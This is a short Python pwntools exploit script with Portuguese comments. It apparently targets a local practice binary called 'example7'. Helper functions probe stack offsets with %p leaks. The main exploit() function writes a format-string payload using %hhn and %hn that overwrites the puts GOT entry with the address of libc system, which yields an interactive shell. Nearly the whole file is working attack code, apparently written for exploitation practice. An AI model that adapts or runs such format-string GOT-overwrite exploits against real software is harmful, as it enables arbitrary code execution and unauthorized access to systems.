#!/usr/bin/python3
from pwn import *

#puts@got 0x404018

#0x404018 <puts@got.plt>:        0x00007ffff7e565a0
#gefâž¤  x/2i system
#  0x7ffff7e24410 <__libc_system>:      endbr64
#4158800912 = E2 4410


puts_got = p64(0x404018)
puts_got_3 = p64(0x404018+2)


#ok, achar o offset correto pode ser complicado, sobretudo pq depende do proprio payload
def test():
  p = process("example7")
  payload = b"%p."*20+b"A"*8
  p.sendline(payload)
  p.interactive()

def test2():
  p = process("example7")
  payload = b"%7$p...."+b"A"*8
  p.sendline(payload)
  p.interactive()

def test3():
  p = process("example7")
  payload = b"%7$p...."+puts_got
  p.sendline(payload)
  p.interactive()


def exploit():
  p = process("example7")
  #
  byte1=17424 #0x4410
  byte2=226 #0xE2
  diferenca=17198 #432E

  #escreve o BYTE 0xE2 no puts_got+3 (offset 11 da memoria)
  parte1 = b"%226p%11$hhn"

  #escreve o WORD 0x4410 no puts_got+0 (offset 10 da memoria)
  parte2 = b"%17198p%10$hn"

  #forca o alinhamento
  padSize= (8 - (len(parte1+parte2)%8) ) * b"A"

  #poe os offsets 10 e 11 respectivamente
  enderecos = puts_got + puts_got_3


  payload = parte1 + parte2 + padSize + enderecos

  print("[Payload]",payload)

  input(">")
  p.sendline(payload)

  #digite /bin/sh como parametro pra system
  p.interactive()

exploit()
